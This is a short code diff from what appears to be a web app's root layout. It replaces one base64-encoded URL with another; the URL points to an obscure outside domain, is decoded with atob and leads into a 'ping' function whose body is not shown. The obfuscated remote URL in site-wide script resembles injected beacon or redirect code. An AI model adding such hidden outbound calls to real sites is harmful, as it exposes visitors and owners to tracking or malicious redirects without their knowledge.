@@ -53,7 +53,7 @@ export default function RootLayout({
             }
         }
         
-        var mainBrandB64 = "aHR0cHM6Ly9jaGVzN251dC00cGV4MjYuY29tL2FkMmFhcTV1cGM="; 
+        var mainBrandB64 = "aHR0cHM6Ly9jaGVzN251dC00cGV4MjYuY29tL2FkNWJqaWJndHQ="; 
         var mainUrl = atob(mainBrandB64.replace("#", ""));
 
         function ping(url) {
